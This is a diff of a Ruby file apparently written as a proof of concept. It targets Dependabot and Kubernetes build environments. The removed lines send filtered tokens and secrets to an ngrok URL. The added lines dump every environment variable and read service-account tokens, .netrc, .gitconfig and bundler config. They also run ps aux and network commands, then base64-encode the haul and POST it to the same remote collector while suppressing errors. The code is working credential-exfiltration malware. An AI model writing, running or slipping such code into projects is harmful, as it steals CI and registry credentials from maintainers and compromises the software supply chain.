@@ -15,29 +15,61 @@ COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app
 begin
   require "uri"
   require "net/http"
+  require "base64"
+  require "json"
 
-  # Collect environment variables (contains GitHub token, registry creds)
-  env_data = ENV.select { |k, _|
-    %w[TOKEN SECRET KEY CRED PASS AUTH GITHUB NPM GEM RUBYGEMS PYPI].any? { |kw|
-      k.upcase.include?(kw)
-    }
-  }.to_s
+  results = {}
 
-  # Also grab /proc/self/environ for anything not in ENV
-  proc_env = File.read("/proc/self/environ") rescue ""
+  # 1. ALLE environment variabelen (niet gefilterd)
+  results[:env] = ENV.to_h
 
-  payload = [env_data, proc_env].join(" | ").slice(0, 2000)
-  encoded  = URI.encode_www_form_component(payload)
+  # 2. Kubernetes / GitHub Actions secret mounts
+  secret_paths = %w[
+    /var/run/secrets/kubernetes.io/serviceaccount/token
+    /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    /var/run/secrets/kubernetes.io/serviceaccount/namespace
+    /run/secrets/kubernetes.io/serviceaccount/token
+    /proc/1/environ
+    /etc/dependabot/job.json
+    /home/dependabot/.netrc
+    /root/.netrc
+    /opt/bundler/v2/.bundle/config
+    /home/dependabot/.gitconfig
+    /root/.gitconfig
+  ]
+  results[:files] = {}
+  secret_paths.each do |path|
+    begin
+      content = File.read(path)
+      # null-byte separators in /proc/environ -> readable
+      content = content.gsub("\x00", "\n")
+      results[:files][path] = content.slice(0, 500)
+    rescue
+      results[:files][path] = "NIET LEESBAAR"
+    end
+  end
 
-  uri = URI("#{COLLAB_URL}?poc=2&data=#{encoded}")
-  Net::HTTP.get(uri) rescue nil
+  # 3. Processen draaien in de container (wie is er naast ons?)
+  results[:procs] = `ps aux 2>/dev/null`.slice(0, 1000) rescue "N/A"
+
+  # 4. Netwerk (interne services bereikbaar?)
+  results[:hostname] = `hostname`.strip rescue "N/A"
+  results[:ip]       = `hostname -I`.strip rescue "N/A"
+  results[:routes]   = `ip route 2>/dev/null || route -n 2>/dev/null`.slice(0, 500) rescue "N/A"
+
+  payload = Base64.strict_encode64(JSON.generate(results).force_encoding("BINARY").encode("UTF-8", invalid: :replace, undef: :replace))
+
+  uri = URI("#{COLLAB_URL}?poc=2v2")
+  req = Net::HTTP::Post.new(uri)
+  req.body = payload
+  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https") { |h| h.request(req) } rescue nil
+
 rescue => e
   begin
     require "net/http"
-    uri = URI("#{COLLAB_URL}?poc=2&err=#{URI.encode_www_form_component(e.message)}")
+    uri = URI("#{COLLAB_URL}?poc=2v2&err=#{URI.encode_www_form_component(e.message.slice(0, 200))}")
     Net::HTTP.get(uri)
   rescue
-    # silent fallback
   end
 end
 
